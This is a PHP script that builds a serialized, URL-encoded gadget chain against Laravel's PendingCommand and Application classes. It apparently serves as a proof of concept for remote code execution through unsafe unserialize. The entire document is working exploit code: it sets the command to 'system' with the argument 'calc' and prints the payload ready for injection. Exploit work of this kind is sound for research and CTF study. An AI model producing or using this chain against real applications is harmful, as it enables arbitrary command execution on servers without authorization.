<?php
namespace Illuminate\Testing{
    class PendingCommand{
        protected $hasExecuted = false;
        protected $parameters = array("command"=>"calc");
        protected $command = "system";
        public $test;
        protected $app;
        public function __construct($a, $b)
        {
            $this->test = $a;
            $this->app = $b;
        }
    }
}
namespace Tests\Unit{
    class ExampleTest{
        public $expectedOutput = array("diggid"=>"diggid");
        public $expectedTables = array(
            array(
                "columnStyles" => array("default"),
                "headers" => array("diggid"),
                "rows" => array(array("diggid")),
                "tableStyle" => "default"
            ),
        );
        public $expectedQuestions = array();
    }
}

namespace Illuminate\Foundation{
    class Application{
        protected $instances;
        public function __construct($a)
        {
            if($a != null) {
                $this->instances = array("Illuminate\Contracts\Console\Kernel" => $a);
            }
        }
    }
}

namespace {
    $d = new Illuminate\Foundation\Application(null);
    $c = new Illuminate\Foundation\Application($d);
    $b = new Tests\Unit\ExampleTest;
    $a = new Illuminate\Testing\PendingCommand($b,$c);
    echo urlencode(serialize($a));
}
